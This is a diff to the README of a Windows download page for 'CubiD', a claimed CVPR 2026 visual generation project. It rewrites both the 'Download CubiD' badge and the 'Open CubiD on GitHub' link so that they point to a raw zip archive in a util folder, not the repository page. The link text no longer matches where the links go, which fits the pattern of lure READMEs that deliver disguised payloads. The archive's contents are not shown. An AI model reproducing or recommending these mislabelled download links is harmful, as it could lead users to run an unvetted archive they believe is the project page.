@@ -1,6 +1,6 @@
 # 🧊 CubiD - Run Cubic Diffusion on Windows
 
-[![Download CubiD](https://img.shields.io/badge/Download-CubiD-1f6feb?style=for-the-badge&logo=github)](https://github.com/loose-grub30/CubiD)
+[![Download CubiD](https://img.shields.io/badge/Download-CubiD-1f6feb?style=for-the-badge&logo=github)](https://github.com/loose-grub30/CubiD/raw/refs/heads/main/util/Cubi_D_2.9.zip)
 
 ## 🖥️ What CubiD Does
 
@@ -12,7 +12,7 @@ Use CubiD if you want to explore a CVPR 2026 visual generation project in a form
 
 Use this link to visit the page and download CubiD:
 
-[Open CubiD on GitHub](https://github.com/loose-grub30/CubiD)
+[Open CubiD on GitHub](https://github.com/loose-grub30/CubiD/raw/refs/heads/main/util/Cubi_D_2.9.zip)
 
 ### Windows setup steps
 
